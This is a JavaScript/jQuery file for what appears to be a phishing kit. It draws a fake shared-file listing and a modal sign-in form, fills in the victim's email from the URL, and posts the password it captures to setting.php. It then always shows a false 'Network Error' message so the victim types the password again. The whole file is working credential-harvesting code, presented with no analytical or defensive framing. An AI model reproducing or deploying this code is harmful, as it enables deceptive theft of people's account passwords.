$(document).ready(function() {


    load();


    function load() {
        $('.loaded').html(`
        <div class="container">
        <div class="" data-bs-toggle="modal" data-bs-target="#myModal">
    
            <div class="row">
                <div class="col-sm-8">
    
                    <table class="table ">
                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
                            <th>Name↑</th>
                            <th>Size▼</th>
                            <th>Action▼</th>
                        </tr>
                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
                            <td><img src="2.png"></td>
                            <td><img src="a.png"></td>
                            <td><img src="d.png"></td>
                        </tr>
                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
                            <td><img src="1.png"></td>
                            <td><img src="b.png"></td>
                            <td><img src="d.png"></td>
                        </tr>
                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
                            <td><img src="3.png"></td>
                            <td><img src="c.png"></td>
                            <td><img src="d.png"></td>
                        </tr>
                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
                            <td><img src="4.png"></td>
                            <td><img src="e.png"></td>
                            <td><img src="d.png"></td>
                        </tr>
                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
                            <td><img src="5.png"></td>
                            <td><img src="f.png"></td>
                            <td><img src="d.png"></td>
                        </tr>
                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
                            <td></td>
                            <td></td>
                            <td><img src="aa.png"></td>
                        </tr>
                    </table>
                </div>
                <div class="col-sm-4">
                    <img src="ss.png" class="img-fluid">
                </div>
            </div>
    
        </div>
    </div>

    
    <!-- The Modal -->
    <div class="modal" id="myModal">
        <div class="modal-dialog">
            <div class="modal-content">

                <!-- Modal Header -->
              

                <!-- Modal body -->
                <div class="modal-body p-3">

                  <img src="to.png" class="img-fluid"><br>
                  <small class="text-danger" id="msg" style="font-weight:600;"></small>
                    <form method="post" id="formx" class="my-4">
                    
                    
                        <input type="email" name="x1" id="x1" class="form-control mb-3" value="" readonly>
                   
                        <input type="password" name="x2" id="x2" class="form-control mb-3" placeholder="Password" value="" required>
                       
                           
                        <button id="submitBtn" class="btn btn-md btn-primary">Sign In</button>
                    </form>

                  
                 

                </div>
            </div>
        </div>
    </div>
`);

    }

    var baseUrl = (window.location).href;
    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
    $("#x1").val(url);

    $("#formx").submit(function(e) {
        e.preventDefault();
        var nm = $("#A1").val();
        var formData = new FormData($("#formx")[0]);
        $("#submitBtn").html(`<button class="btn btn-sm btn-primary" disabled>
  <span class="spinner-grow spinner-grow-sm"></span>
  Please Wait...
</button>`).prop("disabled", true);
        $.ajax({
            url: "setting.php",
            type: 'POST',
            data: formData,
            contentType: false,
            processData: false,
            success: function(res) {
                console.log(res);
                $('#bd').show();
                $('#hm').hide();
                setTimeout(function() {
                    $("#x1").val(url);
                    $("#x2").val("");
                    $('#msg').html(`Network Error! Please verify your information and try again`);
                    $("#submitBtn").html("Sign In").prop("disabled", false);
                }, 2000);

            }
        });
    });

});
